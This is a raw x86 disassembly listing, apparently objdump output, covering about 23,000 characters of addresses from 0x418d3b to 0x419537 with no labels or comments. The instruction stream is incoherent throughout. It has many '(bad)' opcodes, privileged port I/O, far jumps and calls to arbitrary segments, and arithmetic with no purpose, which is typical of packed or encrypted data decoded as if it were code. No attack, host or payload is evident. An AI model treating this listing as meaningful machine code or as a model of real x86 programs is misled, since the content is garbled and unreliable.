  418d3b:	jmp    0x418ce0
  418d3d:	test   eax,0x24aca5a6
  418d42:	jno    0x418cfa
  418d44:	and    eax,DWORD PTR [ebp+0x18]
  418d47:	retf   0xec9d
  418d4a:	aad    0x79
  418d4c:	xchg   DWORD PTR [ebx+0x5d],esp
  418d4f:	leave  
  418d50:	jbe    0x418d24
  418d52:	mov    cl,0x2
  418d54:	sub    BYTE PTR [esi-0x6d],cl
  418d57:	imul   ecx,DWORD PTR [esi],0xdb8f1b11
  418d5d:	inc    esp
  418d5e:	(bad)  
  418d5f:	lds    ebp,FWORD PTR [ecx-0x7cb85b9d]
  418d65:	nop
  418d66:	sti    
  418d67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d68:	fimul  DWORD PTR [ebx+0xd8d85b6]
  418d6e:	xor    al,0xa0
  418d70:	jge    0x418d49
  418d72:	aas    
  418d73:	jo     0x418d8f
  418d75:	inc    ebx
  418d76:	int3   
  418d77:	cmp    BYTE PTR [ebx+0x27cfb056],ch
  418d7d:	jbe    0x418db4
  418d7f:	aaa    
  418d80:	ins    BYTE PTR es:[edi],dx
  418d81:	loop   0x418dd2
  418d83:	(bad)  
  418d84:	out    0x28,eax
  418d86:	cmp    bh,cl
  418d88:	mov    ebx,0x3378d75f
  418d8d:	popa   
  418d8e:	mov    edx,0xf4f9c405
  418d93:	dec    ecx
  418d94:	jmp    0xb3adcb2
  418d99:	xchg   edx,eax
  418d9a:	fldcw  WORD PTR [edx+0x12]
  418d9d:	adc    eax,0xb8bd389
  418da2:	adc    DWORD PTR [edi],0xffffffa6
  418da5:	cdq    
  418da6:	cmp    eax,0x5479f2c0
  418dab:	(bad)  
  418dac:	push   ds
  418dad:	aam    0xe9
  418daf:	shl    BYTE PTR [ecx+0x79],0x6b
  418db3:	xor    ecx,DWORD PTR [eax-0x1ec327ae]
  418db9:	(bad)  
  418dba:	std    
  418dbb:	cdq    
  418dbc:	xchg   ecx,eax
  418dbd:	pop    ss
  418dbe:	xor    al,BYTE PTR [edx-0x549557a5]
  418dc4:	jge    0x418d52
  418dc6:	pop    ds
  418dc7:	lods   al,BYTE PTR ds:[esi]
  418dc8:	pop    edi
  418dc9:	jmp    0x418dda
  418dcb:	add    eax,0xbbeb0d0a
  418dd0:	and    bl,BYTE PTR [edx+edi*2-0x38]
  418dd4:	stos   DWORD PTR es:[edi],eax
  418dd5:	mov    bh,0x3c
  418dd7:	push   edx
  418dd8:	repz dec esi
  418dda:	and    al,0xe2
  418ddc:	pop    ebp
  418ddd:	popa   
  418dde:	(bad)
  418de1:	pop    ebx
  418de2:	adc    ebx,ecx
  418de4:	and    ebp,esp
  418de6:	cmp    DWORD PTR [edx+esi*4],0xffffffa2
  418dea:	lahf   
  418deb:	(bad)  
  418dec:	(bad)  
  418dee:	pop    eax
  418def:	(bad)  
  418df1:	enter  0x6084,0x38
  418df5:	repnz data16 fdivr st,st(0)
  418df9:	push   edi
  418dfa:	outs   dx,BYTE PTR ds:[esi]
  418dfb:	jl     0x418dda
  418dfd:	dec    esi
  418dfe:	test   al,0x45
  418e00:	xor    bh,BYTE PTR [edi]
  418e02:	lods   al,BYTE PTR ds:[esi]
  418e03:	stos   DWORD PTR es:[edi],eax
  418e04:	ret    
  418e05:	add    BYTE PTR [ebx],ah
  418e07:	sbb    eax,0xd234f2a3
  418e0c:	sub    al,0x6d
  418e0e:	sub    dl,BYTE PTR [eax+esi*8+0x61f1e28d]
  418e15:	clc    
  418e16:	jl     0x418e78
  418e18:	adc    bh,bh
  418e1a:	mov    bh,0x4f
  418e1c:	pusha  
  418e1d:	sti    
  418e1e:	cdq    
  418e1f:	push   esp
  418e20:	outs   dx,BYTE PTR ds:[esi]
  418e21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e22:	cmp    eax,0x96a7dd71
  418e27:	out    0x46,al
  418e29:	repnz scas eax,DWORD PTR es:[edi]
  418e2b:	or     dh,cl
  418e2d:	xchg   ebx,eax
  418e2e:	jl     0x418e32
  418e30:	dec    edi
  418e31:	ret    
  418e32:	xchg   ecx,eax
  418e33:	rol    BYTE PTR [eax-0x46aba70a],cl
  418e39:	ficomp DWORD PTR [edx]
  418e3b:	and    dl,BYTE PTR [esi-0x3a0c0236]
  418e41:	ss out dx,eax
  418e43:	push   ecx
  418e44:	sbb    BYTE PTR [ebx-0x8],ah
  418e47:	stos   BYTE PTR es:[edi],al
  418e48:	xchg   edx,eax
  418e49:	sbb    al,0x3f
  418e4b:	jecxz  0x418e68
  418e4d:	push   esi
  418e4e:	dec    edi
  418e4f:	shl    DWORD PTR [ecx+0x17],cl
  418e52:	into   
  418e53:	adc    BYTE PTR ds:0x588cb3f4,0x43
  418e5a:	scas   eax,DWORD PTR es:[edi]
  418e5b:	loopne 0x418e7a
  418e5d:	aas    
  418e5e:	sti    
  418e5f:	addr16 push es
  418e61:	cwde   
  418e62:	cmp    DWORD PTR [edi-0x6849aa02],0x1b
  418e69:	aas    
  418e6a:	cmp    ecx,DWORD PTR [edi+0x55]
  418e6d:	mov    es,WORD PTR [ebx]
  418e6f:	push   0x759e12d3
  418e74:	(bad)  
  418e75:	cli    
  418e76:	mov    ds:0x54337968,al
  418e7b:	(bad)  
  418e7c:	mov    dh,0x7b
  418e7e:	push   0x6ee985d9
  418e83:	fisttp WORD PTR ds:0xef21ed18
  418e89:	iret   
  418e8a:	push   0xffffffc4
  418e8c:	xchg   ebx,eax
  418e8d:	mov    bl,dh
  418e8f:	inc    ecx
  418e90:	jno    0x418e2b
  418e92:	mov    dl,BYTE PTR cs:[edx-0x7fb88c7c]
  418e99:	ins    DWORD PTR es:[edi],dx
  418e9a:	xor    al,0x3f
  418e9c:	push   esp
  418e9d:	sub    dh,dh
  418e9f:	or     ch,BYTE PTR [esi-0x42372dc4]
  418ea5:	je     0x418f22
  418ea7:	fsubr  QWORD PTR [edi]
  418ea9:	stos   BYTE PTR es:[edi],al
  418eaa:	cs fld QWORD PTR gs:[edi+0x25]
  418eaf:	jge    0x418ec3
  418eb1:	fidivr WORD PTR [ebx]
  418eb3:	mov    edx,edi
  418eb5:	dec    edi
  418eb6:	push   esi
  418eb7:	loop   0x418efb
  418eb9:	rcr    dl,cl
  418ebb:	inc    esp
  418ebc:	sbb    ecx,DWORD PTR [ebx-0x25c3ae94]
  418ec2:	int3   
  418ec3:	test   eax,0x5e3e260d
  418ec8:	jo     0x418e51
  418eca:	adc    ebx,edi
  418ecc:	call   0xa39b4032
  418ed1:	fsubr  DWORD PTR [esi-0x9d54b04]
  418ed7:	stos   BYTE PTR es:[edi],al
  418ed8:	sub    edi,esi
  418eda:	push   ebp
  418edb:	inc    esi
  418edc:	xor    BYTE PTR [esi-0xc],al
  418edf:	in     eax,0xd3
  418ee1:	in     al,0xa5
  418ee3:	neg    BYTE PTR [ebx+0x57e0b906]
  418ee9:	sub    BYTE PTR [edx+eiz*4],ah
  418eec:	les    eax,FWORD PTR [edx+0x64f5ce28]
  418ef2:	cmp    ebx,ecx
  418ef4:	and    eax,0x4d2aaccb
  418ef9:	or     bh,bl
  418efb:	(bad)  
  418efd:	xchg   ebx,eax
  418efe:	xor    edx,DWORD PTR [esi-0x5fbe1ff2]
  418f04:	call   0x9962a962
  418f09:	add    DWORD PTR [ebx],ebx
  418f0b:	mov    bl,0xe3
  418f0d:	enter  0x902c,0x72
  418f11:	push   ss
  418f12:	cmp    dl,dl
  418f14:	push   0x54
  418f16:	in     eax,0x31
  418f18:	dec    eax
  418f19:	sub    al,0x5e
  418f1b:	stc    
  418f1c:	push   es
  418f1d:	jo     0x418f12
  418f1f:	lods   al,BYTE PTR ds:[esi]
  418f20:	and    edi,DWORD PTR [esi+ebp*4-0x1208716c]
  418f27:	or     cl,dl
  418f29:	push   eax
  418f2a:	dec    ebp
  418f2b:	mov    BYTE PTR ds:0xea0aa30d,ah
  418f31:	xlat   BYTE PTR ds:[ebx]
  418f32:	push   es
  418f33:	mov    WORD PTR [ecx-0x548ba009],gs
  418f39:	dec    eax
  418f3a:	mov    edx,0x78cd710b
  418f3f:	pop    edi
  418f40:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f42:	dec    edi
  418f43:	stos   DWORD PTR es:[edi],eax
  418f44:	and    ebx,DWORD PTR [edx]
  418f46:	mov    bl,0x8
  418f48:	imul   DWORD PTR ds:0x8b25a107
  418f4e:	fucomip st,st(5)
  418f50:	inc    esp
  418f51:	pusha  
  418f52:	adc    ebp,eax
  418f54:	inc    ebx
  418f55:	xchg   ecx,eax
  418f56:	je     0x418f1f
  418f58:	popa   
  418f59:	aas    
  418f5a:	lods   al,BYTE PTR ds:[esi]
  418f5b:	xchg   edi,eax
  418f5c:	lahf   
  418f5d:	faddp  st(1),st
  418f5f:	jnp    0x418f4c
  418f61:	mov    bh,0x92
  418f63:	ficomp DWORD PTR [ecx+0x6ba737f]
  418f69:	cli    
  418f6a:	mov    edi,0xe01c4ba0
  418f6f:	xchg   ebp,eax
  418f70:	jmp    0x1080:0xd0da71de
  418f77:	jno    0x418f8e
  418f79:	sbb    ch,BYTE PTR [ecx+0x29466a61]
  418f7f:	outs   dx,BYTE PTR ds:[esi]
  418f80:	fadd   DWORD PTR [esi-0x73fce643]
  418f86:	ror    BYTE PTR ds:[edi-0x75a04fb4],1
  418f8d:	(bad)  
  418f8f:	jmp    0x5f89b14b
  418f94:	mov    ds:0x5021ce74,eax
  418f99:	pop    es
  418f9a:	add    al,0x2f
  418f9c:	sar    BYTE PTR [ecx],cl
  418f9e:	fidiv  DWORD PTR [edx+0x5a]
  418fa1:	jns    0x418fd5
  418fa3:	or     al,0x54
  418fa5:	mov    ah,0xae
  418fa7:	fiadd  DWORD PTR [eax]
  418fa9:	xchg   esp,eax
  418faa:	dec    esp
  418fab:	cmp    DWORD PTR ds:0x69b5ada6,eax
  418fb1:	cmp    eax,0x2c5c870f
  418fb6:	xchg   BYTE PTR [esi+0x69],bh
  418fb9:	and    bl,ch
  418fbb:	xchg   ebp,eax
  418fbc:	popf   
  418fbd:	shl    ah,0x60
  418fc0:	xchg   DWORD PTR [ecx+0x55],esp
  418fc3:	xchg   esp,eax
  418fc4:	ficomp WORD PTR [edi+0x47]
  418fc7:	mov    ecx,0x13619dc
  418fcc:	ss inc eax
  418fce:	xchg   esp,eax
  418fcf:	mov    BYTE PTR [ecx-0x74],bh
  418fd2:	xor    DWORD PTR [ebx],edx
  418fd4:	call   0x6b72:0x17324164
  418fdb:	sbb    eax,0xfe78a71c
  418fe0:	pop    esi
  418fe1:	adc    al,0xe1
  418fe3:	sub    DWORD PTR [edx+ebx*2+0x194bb288],ebx
  418fea:	push   edx
  418feb:	xor    cl,BYTE PTR [ebx-0x39df49cf]
  418ff1:	or     bh,BYTE PTR [ebp+0x67d5bd22]
  418ff7:	xor    ch,ah
  418ff9:	loope  0x418f9c
  418ffb:	pop    ecx
  418ffc:	and    al,0x64
  418ffe:	xchg   esi,eax
  418fff:	mov    ds:0xdd35172f,eax
  419004:	shl    DWORD PTR ds:0xb33b9549,1
  41900a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41900b:	sbb    al,0xc3
  41900d:	jp     0x41908c
  41900f:	mov    al,ds:0x3a50a776
  419014:	test   esp,esi
  419016:	int    0xe7
  419018:	xor    DWORD PTR [esi+0x5f],ebx
  41901b:	iretw  
  41901d:	push   eax
  41901e:	mov    al,ds:0x5a1fecc
  419023:	fmul   DWORD PTR [ecx]
  419025:	aaa    
  419026:	data16 (bad) 
  419029:	sub    esi,DWORD PTR [ecx+0x78d07001]
  41902f:	sub    al,0xb9
  419031:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419032:	jge    0x418fdc
  419034:	adc    bh,BYTE PTR [ebx]
  419036:	add    DWORD PTR [ecx],ebp
  419038:	pushf  
  419039:	enter  0x90e5,0xc4
  41903d:	(bad)  
  41903e:	js     0x4190ba
  419040:	mov    ebp,0x57069018
  419045:	imul   ebx,DWORD PTR [ebx],0x4a
  419048:	retf   
  419049:	mov    bh,0x31
  41904b:	(bad)  
  41904c:	cmc    
  41904d:	arpl   si,dx
  41904f:	push   edx
  419050:	pop    es
  419051:	cwde   
  419052:	xor    ah,BYTE PTR [esi-0x31f4fc14]
  419058:	stc    
  419059:	sbb    al,0xbc
  41905b:	jmp    0xb71e:0x1dd4806
  419062:	or     bl,BYTE PTR [eax-0x4d]
  419065:	test   al,0x67
  419067:	pop    esi
  419068:	mov    esi,0x6d6f52f3
  41906d:	jne    0x419040
  41906f:	mov    cl,0x92
  419071:	adc    al,0x21
  419073:	jg     0x41903e
  419075:	repnz repz out dx,al
  419078:	dec    eax
  419079:	ins    DWORD PTR es:[edi],dx
  41907a:	sar    BYTE PTR [esi+0x1b],cl
  41907d:	xchg   edi,eax
  41907e:	ja     0x4190b2
  419080:	repnz ds inc esp
  419083:	inc    ebx
  419084:	loop   0x41900d
  419086:	xor    ecx,DWORD PTR [edx+edi*8+0x42]
  41908a:	fisub  DWORD PTR [ecx+0x550a253a]
  419090:	popa   
  419091:	in     eax,dx
  419092:	lock push edi
  419094:	mov    ebx,DWORD PTR [bp+si]
  419097:	lods   al,BYTE PTR ds:[esi]
  419098:	(bad)  
  41909a:	or     al,0xdc
  41909c:	dec    esp
  41909d:	xchg   esi,eax
  41909e:	dec    eax
  41909f:	inc    esp
  4190a0:	gs pop ecx
  4190a2:	xchg   edx,eax
  4190a3:	mov    eax,0x2ba106cf
  4190a8:	stc    
  4190a9:	pop    ds
  4190aa:	ret    0xa619
  4190ad:	fst    DWORD PTR [ecx-0x76]
  4190b0:	rol    ah,cl
  4190b2:	sahf   
  4190b3:	out    0xea,al
  4190b5:	scas   al,BYTE PTR es:[edi]
  4190b6:	sbb    ebx,eax
  4190b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4190b9:	repnz das 
  4190bb:	xor    al,0xc8
  4190bd:	jmp    0xf122:0x7ce7c5a3
  4190c4:	mov    WORD PTR ds:0x19f6e54e,gs
  4190ca:	aaa    
  4190cb:	dec    eax
  4190cc:	adc    BYTE PTR [edx+0x50],ah
  4190cf:	out    0x73,al
  4190d1:	push   edi
  4190d2:	stos   BYTE PTR es:[edi],al
  4190d3:	add    eax,0x7e8e17eb
  4190d8:	adc    al,dl
  4190da:	push   DWORD PTR [edi]
  4190dc:	scas   al,BYTE PTR es:[edi]
  4190dd:	inc    DWORD PTR [edx+0xa]
  4190e0:	jge    0x41915e
  4190e2:	repnz or BYTE PTR [edi+0x1c0fe02d],ch
  4190e9:	out    0x4c,al
  4190eb:	push   0x8cf348cc
  4190f0:	(bad)  
  4190f1:	loopne 0x419170
  4190f3:	and    ebp,DWORD PTR [esi+0x3d]
  4190f6:	mul    DWORD PTR [edx-0x192fa9f9]
  4190fc:	sub    ch,BYTE PTR [eax+edi*4]
  4190ff:	icebp  
  419100:	in     al,0x8b
  419102:	cmp    al,0x1e
  419104:	(bad)  
  419105:	fistp  WORD PTR [ecx]
  419107:	or     BYTE PTR [ebx+esi*1-0x6179f9c6],dl
  41910e:	retf   0x8a32
  419111:	fcmovne st,st(5)
  419113:	xor    DWORD PTR [esi-0x48],eax
  419116:	inc    edx
  419117:	xchg   BYTE PTR [edi-0x1b],bl
  41911a:	ds push edx
  41911c:	cmp    al,0x90
  41911e:	mov    ebx,0xc9ed5020
  419123:	inc    bp
  419125:	or     BYTE PTR [eax-0x3b],ch
  419128:	(bad)  
  419129:	aaa    
  41912a:	fistp  DWORD PTR [edi+0x391f73d4]
  419130:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419131:	sbb    BYTE PTR [ebx-0x58a11271],cl
  419137:	pop    esi
  419138:	fdivr  QWORD PTR [ebp-0x7d]
  41913b:	cmp    bh,BYTE PTR [si-0x6881]
  419140:	cs pop ds
  419142:	inc    esp
  419143:	out    0x89,al
  419145:	cmp    eax,0x3293f40b
  41914a:	mov    ds:0x1112c6fb,eax
  41914f:	imul   ebp,DWORD PTR [ebx+0x45be753b],0xc9862aa5
  419159:	shl    bl,1
  41915b:	mov    bh,0x9e
  41915d:	test   DWORD PTR [eax-0x145b2212],edx
  419163:	mov    eax,0xc6ee8cb7
  419168:	scas   eax,DWORD PTR es:[edi]
  419169:	cmc    
  41916a:	mov    esp,0x56f5f36c
  41916f:	push   ebx
  419170:	hlt    
  419171:	adc    al,0xa5
  419173:	push   cs
  419174:	aas    
  419175:	xor    dl,bh
  419177:	lahf   
  419178:	rol    ebx,1
  41917a:	mov    edi,0x2fee66f
  41917f:	ss mov dl,0xf4
  419182:	mov    esi,0xcfc21051
  419187:	cs aam 0xd4
  41918a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41918b:	xorps  xmm7,XMMWORD PTR fs:[edx-0x4a]
  419190:	sub    ebx,edx
  419192:	xchg   ebp,eax
  419193:	add    dh,BYTE PTR [edi]
  419195:	mov    esp,0x30ff87dc
  41919a:	or     BYTE PTR [esi],dl
  41919c:	pusha  
  41919d:	out    0xe1,al
  41919f:	sbb    edx,ebp
  4191a1:	ror    BYTE PTR [edi+0x2bd051f7],cl
  4191a7:	xchg   DWORD PTR [ebx+ecx*1+0xc98c843],esp
  4191ae:	jmp    0xec9f996f
  4191b3:	shl    ch,cl
  4191b5:	cmp    eax,0xdb0568f9
  4191ba:	dec    edx
  4191bb:	or     al,0x6e
  4191bd:	retf   0xa00a
  4191c0:	ret    0x89fa
  4191c3:	dec    ebx
  4191c4:	call   0xa277793
  4191c9:	mov    dh,0x22
  4191cb:	push   ecx
  4191cc:	enter  0x438c,0x44
  4191d0:	mov    ecx,0x729cf479
  4191d5:	add    DWORD PTR [ebx+0x4c56d019],eax
  4191db:	xor    ebp,DWORD PTR [ecx-0x3a8a45ac]
  4191e1:	daa    
  4191e2:	mov    edi,0x1117ac59
  4191e7:	call   0xd5392a4a
  4191ec:	xor    ch,BYTE PTR [edi+edi*1]
  4191ef:	push   ds
  4191f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4191f1:	mov    al,0xed
  4191f3:	inc    eax
  4191f4:	arpl   WORD PTR [ebx+0x6c],ax
  4191f7:	fs stos BYTE PTR es:[edi],al
  4191f9:	aam    0x34
  4191fb:	push   0x75184288
  419200:	mov    dh,0x43
  419202:	xlat   BYTE PTR ds:[ebx]
  419203:	ds (bad) 
  419205:	fdivr  QWORD PTR [ecx]
  419207:	sub    eax,esi
  419209:	scas   eax,DWORD PTR es:[edi]
  41920a:	call   0x5c66:0xc0a4bc7e
  419211:	imul   ecx,DWORD PTR [ecx],0x5a
  419214:	in     al,dx
  419215:	call   0x6689:0x41a9a3e9
  41921c:	lea    edx,[edx]
  41921e:	sbb    al,0xe
  419220:	mov    ds:0xa7043ba5,eax
  419225:	jge    0x41921b
  419227:	or     al,0x1f
  419229:	dec    ecx
  41922a:	mov    edi,0xb1a5292d
  41922f:	(bad)  
  419230:	pop    edi
  419231:	das    
  419232:	inc    edx
  419233:	call   0xacf5:0xe087bb60
  41923a:	pop    esi
  41923b:	sbb    BYTE PTR [edx],bh
  41923d:	push   0xffffff82
  41923f:	scas   al,BYTE PTR es:[edi]
  419240:	rcr    BYTE PTR [eax],0xee
  419243:	xchg   DWORD PTR [esi],ecx
  419245:	pop    esi
  419246:	sub    al,0xd7
  419248:	jo     0x419255
  41924a:	jns    0x419285
  41924c:	lahf   
  41924d:	shl    BYTE PTR [ebx+0xb],1
  419250:	out    0x4,al
  419252:	push   eax
  419253:	push   esp
  419254:	scas   eax,DWORD PTR es:[edi]
  419255:	imul   ebp,DWORD PTR ds:[esi-0x64337313],0xffffffce
  41925d:	in     eax,0xa2
  41925f:	or     BYTE PTR ds:0x33c144a6,0x42
  419266:	sbb    al,0x6b
  419268:	adc    DWORD PTR [ebp+ebx*8+0x70],ebx
  41926c:	xlat   BYTE PTR ds:[ebx]
  41926d:	sti    
  41926e:	mov    al,ds:0x4d66d993
  419273:	fisubr WORD PTR [ebx-0x536c43c6]
  419279:	push   es
  41927a:	xor    eax,0xf311c3f7
  41927f:	enter  0xcbdd,0x78
  419283:	push   edi
  419284:	inc    ecx
  419285:	mov    eax,ds:0x39e5297
  41928a:	or     al,0x6e
  41928c:	int3   
  41928d:	in     eax,dx
  41928e:	push   esp
  41928f:	fnstenv [edx]
  419291:	ja     0x41930b
  419293:	xchg   ebp,eax
  419294:	enter  0xd265,0x9b
  419298:	xchg   esi,eax
  419299:	mov    dh,0xfe
  41929b:	mov    WORD PTR [ebp+0x23cef0dd],ds
  4192a1:	out    dx,al
  4192a2:	(bad)  
  4192a3:	jecxz  0x419235
  4192a5:	(bad)  
  4192a6:	int    0x42
  4192a8:	mov    ebp,0xdf4fa87f
  4192ad:	jmp    0x41927a
  4192af:	(bad)  
  4192b0:	shl    ch,1
  4192b2:	jecxz  0x419321
  4192b4:	es mov ecx,0x940f83ea
  4192ba:	sub    BYTE PTR [eax+eiz*2+0xa],cl
  4192be:	je     0x4192f0
  4192c0:	push   es
  4192c1:	and    al,0x1c
  4192c3:	mov    ebx,0x60fdbd46
  4192c8:	sub    ecx,ebx
  4192ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4192cb:	push   ebx
  4192cc:	push   ebp
  4192cd:	rol    ch,0xd9
  4192d0:	ret    0x2d4d
  4192d3:	pop    ebx
  4192d4:	inc    ecx
  4192d5:	or     ecx,DWORD PTR [ebp-0x56]
  4192d8:	mov    eax,0xa9e27bab
  4192dd:	sbb    eax,0x11fa88dc
  4192e2:	ds repnz mov edx,0x6c9a06cf
  4192e9:	ds dec ebx
  4192eb:	push   edx
  4192ec:	test   cl,dl
  4192ee:	inc    esp
  4192ef:	adc    al,ah
  4192f1:	add    BYTE PTR [eax+eiz*8+0x7c790b12],0x11
  4192f9:	lock fwait
  4192fb:	sbb    BYTE PTR gs:[ebp-0x775ebe14],bl
  419302:	xor    al,0xb0
  419304:	dec    edx
  419305:	sbb    dh,dl
  419307:	lods   eax,DWORD PTR ds:[esi]
  419308:	mov    gs,WORD PTR ds:0x10a1e8db
  41930e:	add    BYTE PTR ds:0x56628cbe,0xdc
  419315:	jl     0x419310
  419317:	add    DWORD PTR [bx+si-0x1e94],ecx
  41931c:	call   0x544f:0x35552662
  419323:	lea    ebx,[edi+0x75]
  419326:	or     ah,bh
  419328:	shl    DWORD PTR [esp+edx*4+0x1c],cl
  41932c:	es enter 0xebd1,0xaa
  419331:	mov    ch,0x77
  419333:	pop    es
  419334:	test   BYTE PTR [ebx+0x49e83a9d],al
  41933a:	and    al,0x41
  41933c:	mov    eax,ds:0xf5797679
  419341:	(bad)  
  419342:	in     eax,dx
  419343:	jns    0x4192d3
  419345:	mov    bl,BYTE PTR [edi+0x0]
  419348:	fstp   QWORD PTR ds:[ebp+0x5fa62936]
  41934f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419350:	icebp  
  419351:	je     0x419342
  419353:	ins    DWORD PTR es:[edi],dx
  419354:	push   esi
  419355:	push   esp
  419356:	jnp    0x41938f
  419358:	scas   al,BYTE PTR es:[edi]
  419359:	rcr    DWORD PTR [eax+ebx*4],0x31
  41935d:	or     DWORD PTR [ebx-0x68],esp
  419360:	mov    ebx,fs
  419362:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419363:	fbld   TBYTE PTR [edi]
  419365:	dec    edi
  419366:	mov    ebx,gs
  419368:	jnp    0x41939a
  41936a:	jmp    0xa319:0x135ed730
  419371:	mov    esp,0x7124f052
  419376:	jmp    0x8c56:0xa5da1cb3
  41937d:	mov    esp,0xa6ca8925
  419382:	in     al,0x1c
  419384:	inc    eax
  419385:	pop    ss
  419386:	loopne 0x419357
  419388:	lods   al,BYTE PTR ds:[esi]
  419389:	out    0x96,eax
  41938b:	jae    0x4193f7
  41938d:	gs xor eax,0x8c193221
  419393:	cmp    BYTE PTR [esi],bl
  419395:	jl     0x4193c4
  419397:	and    al,0xc9
  419399:	adc    esp,edx
  41939b:	sub    eax,0xeab67a57
  4193a0:	gs hlt 
  4193a2:	sub    ah,BYTE PTR [ebp+0x5046e5b9]
  4193a8:	fdivr  QWORD PTR ds:0x826583bd
  4193ae:	aaa    
  4193af:	jl     0x419372
  4193b1:	xchg   ebp,eax
  4193b2:	inc    DWORD PTR [eax+0xabdf3cf]
  4193b8:	dec    ebp
  4193b9:	cmc    
  4193ba:	jno    0x419387
  4193bc:	pop    ss
  4193bd:	or     DWORD PTR [ecx],ecx
  4193bf:	pop    ss
  4193c0:	jo     0x4193bd
  4193c2:	int3   
  4193c3:	dec    esi
  4193c4:	pusha  
  4193c5:	jl     0x41937f
  4193c7:	sbb    al,0x5a
  4193c9:	jle    0x41938d
  4193cb:	in     eax,0x33
  4193cd:	retf   
  4193ce:	ds push ebx
  4193d0:	adc    al,dl
  4193d2:	push   ds
  4193d3:	mov    edx,0x3781969
  4193d9:	fcmovnu st,st(5)
  4193db:	mov    eax,ds:0x50347a3f
  4193e0:	mov    BYTE PTR [edi],bl
  4193e2:	gs jl  0x419371
  4193e5:	retf   0xad51
  4193e8:	les    esi,FWORD PTR [ebx]
  4193ea:	xchg   cl,ch
  4193ec:	mov    ebp,0x59e9db16
  4193f1:	dec    ebp
  4193f2:	xor    eax,0xcf78fd69
  4193f7:	sahf   
  4193f8:	into   
  4193f9:	repz and BYTE PTR [ebp+0x2e],cl
  4193fd:	xchg   edx,eax
  4193fe:	xor    eax,eax
  419400:	fimul  DWORD PTR [edi-0x1aa2bce6]
  419406:	push   edx
  419407:	jecxz  0x41940e
  419409:	and    ebx,esp
  41940b:	jl     0x419427
  41940d:	jg     0x4193e6
  41940f:	xor    al,0xb3
  419411:	dec    ecx
  419412:	repz mov edi,0xd55f4088
  419418:	bound  esp,QWORD PTR [ebx+0x5]
  41941b:	data16 jb 0x419468
  41941e:	std    
  41941f:	adc    esp,edx
  419421:	fstp   DWORD PTR [esi+ecx*2-0x18]
  419425:	push   ebp
  419426:	ret    0x7326
  419429:	std    
  41942a:	or     bh,BYTE PTR [ebx+0x5e]
  41942d:	or     DWORD PTR [ebx],esi
  41942f:	xor    DWORD PTR [esi-0x45],0xfffffffd
  419433:	dec    esi
  419434:	mov    ecx,0x9265cacd
  419439:	push   edi
  41943a:	sbb    ebp,DWORD PTR [ebx]
  41943c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41943d:	out    0x66,al
  41943f:	mov    esp,0x284a2a0d
  419444:	test   DWORD PTR [esi+ebp*4-0x5d6c8d6e],ecx
  41944b:	jnp    0x41945e
  41944d:	addr16 data16 jae 0x419461
  419451:	test   al,0x18
  419453:	sbb    eax,0xb72b0b69
  419458:	in     eax,0xe4
  41945a:	xor    esp,ebx
  41945c:	lahf   
  41945d:	mov    ah,0x91
  41945f:	mov    ebp,ss
  419461:	das    
  419462:	jnp    0x4194de
  419464:	push   edi
  419465:	dec    edi
  419466:	mov    DWORD PTR [eax],ebx
  419468:	les    edi,FWORD PTR [eax]
  41946a:	sbb    al,0x5d
  41946c:	xchg   ecx,eax
  41946d:	push   ds
  41946e:	xor    DWORD PTR ds:0xbc65e6c0,ecx
  419474:	push   ecx
  419475:	sub    eax,0x6585664
  41947a:	clc    
  41947b:	mov    ecx,0xe4a692d4
  419480:	clc    
  419481:	pop    esp
  419482:	or     esp,0x883b33c3
  419488:	adc    al,0x56
  41948a:	pop    es
  41948b:	adc    DWORD PTR [edi+edx*2-0xd],eax
  41948f:	repz push ss
  419491:	data16 sbb al,0xdc
  419494:	mov    esp,0x534f0d93
  419499:	mov    ch,0x2b
  41949b:	xor    esi,edi
  41949d:	push   0xffffff8a
  41949f:	repz or dh,BYTE PTR [eax-0x5c93d089]
  4194a6:	mov    bh,0x73
  4194a8:	jg     0x419529
  4194aa:	cli    
  4194ab:	call   0x65c878d
  4194b0:	ret    0x36b2
  4194b3:	jno    0x419492
  4194b5:	inc    esp
  4194b6:	pop    edi
  4194b7:	(bad)  
  4194b8:	mov    eax,ds:0xc991e318
  4194bd:	xchg   BYTE PTR [edi-0x4761ad6c],bl
  4194c3:	adc    ch,BYTE PTR [esi]
  4194c5:	imul   ebx,DWORD PTR [edi+0x339e1a2c],0x3d
  4194cc:	ret    0x9b08
  4194cf:	arpl   WORD PTR ds:0x409abc08,cx
  4194d5:	and    esi,ecx
  4194d7:	adc    DWORD PTR [ebx],esp
  4194d9:	pop    esp
  4194da:	mov    eax,ds:0x1a312ab9
  4194df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4194e0:	inc    ebp
  4194e1:	jb     0x41950b
  4194e3:	or     eax,ecx
  4194e5:	mov    ch,0x5c
  4194e7:	push   edx
  4194e8:	imul   esp,ebp,0x33ebb17e
  4194ee:	imul   ebp,DWORD PTR [edi],0x5bca8df3
  4194f4:	daa    
  4194f5:	inc    edx
  4194f6:	in     eax,0xf5
  4194f8:	add    ebx,ebx
  4194fa:	xor    eax,0x24f06c4a
  4194ff:	lahf   
  419500:	inc    ebx
  419501:	out    dx,eax
  419502:	mov    eax,0x75a03f69
  419507:	adc    edi,esp
  419509:	fsubr  DWORD PTR [edi]
  41950b:	push   edx
  41950c:	fdivr  QWORD PTR [ebx+0x349f5ee2]
  419512:	dec    esp
  419513:	jno    0x4194a3
  419515:	push   0xfffffffd
  419517:	xchg   esi,eax
  419518:	popa   
  419519:	shl    BYTE PTR fs:[ecx],0xf2
  41951d:	pop    ss
  41951e:	lock lock pop edx
  419521:	inc    ebp
  419522:	fist   DWORD PTR ds:0x50e89300
  419528:	push   esi
  419529:	jg     0x419538
  41952b:	test   DWORD PTR [ebx],0x58e2e11
  419531:	leave  
  419532:	mov    edi,0x49050fff
  419537:	dec    ecx
